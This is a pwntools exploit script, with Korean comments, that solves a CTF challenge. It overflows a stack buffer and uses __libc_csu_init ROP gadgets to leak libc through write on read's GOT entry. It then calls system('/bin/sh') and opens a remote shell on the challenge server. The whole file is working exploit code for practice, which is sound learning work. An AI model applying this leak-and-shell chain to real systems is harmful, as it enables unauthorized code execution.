from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

context(arch="amd64", os='linux')
e = ELF('./rtc')
libc = ELF('./libc.so.6')

r = remote("ctf.j0n9hyun.xyz", 3025)

# 일반적인 ROP문제
# ROPgadget 으로도 가젯을 찾을 수 있지만
# main에서 가젯을 찾을 수 없다
# 그래서 __libc_csu_init 함수에 있는 가젯을 활용했다
dummy       = b'A'*(0x40+8)
write       = p64(e.plt['write'])
pop_rdi     = p64(0x4006c3)
pop_rsi_r15 = p64(0x4006c1)
main        = p64(0x4005f6)
ret         = p64(0x400491)

payload  = dummy
payload += pop_rdi
payload += p64(0x1)
payload += pop_rsi_r15
payload += p64(e.got['read'])
payload += p64(0x0)
payload += write
payload += main

r.recv()
r.sendline(payload)
base =  u64(r.recv(6)+b"\x00\x00")
base -= 0xf7250
print(hex(base))

payload  = dummy
payload += ret*4
payload += pop_rdi
payload += p64(base + 0x18cd57)
payload += p64(base + 0x45390)
#payload += main

r.sendline(payload)

r.interactive()